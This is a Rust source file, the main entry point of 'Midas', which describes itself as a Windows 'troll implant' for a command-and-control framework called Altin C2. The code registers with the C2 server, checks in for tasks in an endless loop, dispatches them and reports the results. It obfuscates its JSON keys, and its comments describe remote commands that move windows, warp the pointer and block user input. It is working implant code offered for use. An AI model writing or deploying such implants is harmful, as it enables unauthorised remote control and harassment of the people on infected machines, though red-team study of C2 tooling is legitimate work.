//! Midas - troll implant for the Altin C2.
//!
//! Two loops, mirroring `implants/tombili/src/main.nim`: register until the
//! server accepts, then check in forever.
//!
//! The one structural difference from Tombili is that `commands::dispatch`
//! always returns promptly. Visual commands hand off to the GUI thread in
//! `gui` or to a worker thread and acknowledge immediately, because the Web UI
//! stops waiting on a task after 90 seconds and a modal dialog or a 30-second
//! shake would otherwise be reported as a failure even though it worked.

// Windows only. The command surface is built on Win32 - moving another
// application's window, warping the pointer, `BlockInput`, `PlaySoundW` - and
// the X11 backend that used to cover Linux could not do most of it under
// Wayland, so a non-Windows build would compile into something that silently
// did nothing. Say so at build time instead.
//
// The modules are gated too. Without that, every one of them also fails to
// resolve and a cross-compile attempt produces a hundred errors that bury the
// one that explains itself.
#[cfg(not(windows))]
compile_error!(
    "midas is a Windows-only implant; build with `--target x86_64-pc-windows-msvc` \
     (or `-gnu`)"
);

#[cfg(windows)]
mod commands;
#[cfg(windows)]
mod comm;
#[cfg(windows)]
mod config;
#[cfg(windows)]
mod gdi;
#[cfg(windows)]
mod gui;
#[cfg(windows)]
mod info;
#[cfg(windows)]
mod jobs;
#[cfg(windows)]
mod log;
#[cfg(windows)]
mod obf;
#[cfg(windows)]
mod rng;
#[cfg(windows)]
mod sleep;

#[cfg(windows)]
use log::log;

#[cfg(windows)]
fn main() {
    // Before anything else can panic. The default hook's output names only the
    // thread - always one of Midas' own - so it reads the same for every distinct
    // fault and says nothing; the replacement keeps the location and reports it
    // back through `sysinfo`.
    log::install_panic_hook();

    sleep::init();

    log(&format!(
        "{} {} on {} (desktop: {}, elevated: {})",
        config::IMPLANT_ID,
        env!("CARGO_PKG_VERSION"),
        info::os_name(),
        info::gui_available(),
        gui::win::is_elevated(),
    ));

    register();
    checkin_loop();
}

/// Blocks until the server has the agent's manifest, or the failure limit is hit.
///
/// The server answers `STATUS_CONTINUE` both for a fresh registration and for
/// an agent that is already registered, so either ends the loop.
#[cfg(windows)]
fn register() {
    let limit = config::reg_fail_limit();
    let mut failures: u32 = 0;

    loop {
        match comm::send_registration() {
            Ok(comm::STATUS_CONTINUE) => {
                log("registered");
                return;
            }
            Ok(status) => log(&format!("registration returned status {status}")),
            Err(e) => log(&format!("registration failed: {e}")),
        }

        failures += 1;

        if limit > 0 && failures >= limit {
            log("registration failure limit reached, giving up");
            std::process::exit(0);
        }

        sleep::do_sleep();
    }
}

#[cfg(windows)]
fn checkin_loop() {
    loop {
        match comm::checkin() {
            Ok(comm::Checkin::Tasks(tasks)) => {
                for task in tasks {
                    run_task(task);
                }
            }
            Ok(comm::Checkin::NeedsRegistration) => {
                // The agent row was deleted from the Web UI, or the server was
                // restarted against a fresh database. Re-register rather than
                // silently idling forever.
                log("server asked for re-registration");
                register();
            }
            Ok(comm::Checkin::Idle) => {}
            Err(e) => log(&format!("check-in failed: {e}")),
        }

        sleep::do_sleep();
    }
}

#[cfg(windows)]
fn run_task(task: serde_json::Value) {
    let task_id = task
        .get(obf!("task_id"))
        .and_then(|v| v.as_str())
        .unwrap_or_default()
        .to_string();

    let name = task
        .get(obf!("task"))
        .and_then(|v| v.as_str())
        .unwrap_or("?")
        .to_string();

    log(&format!("task {task_id}: {name}"));

    let result = commands::dispatch(&task);
    log(&format!("task {task_id} -> {result}"));

    if let Err(e) = comm::send_task_result(&task_id, &result) {
        // The server re-delivers a task until it sees a result, so a lost one
        // means the command runs again on the next check-in. Worth logging.
        log(&format!("could not report result for {task_id}: {e}"));
    }
}
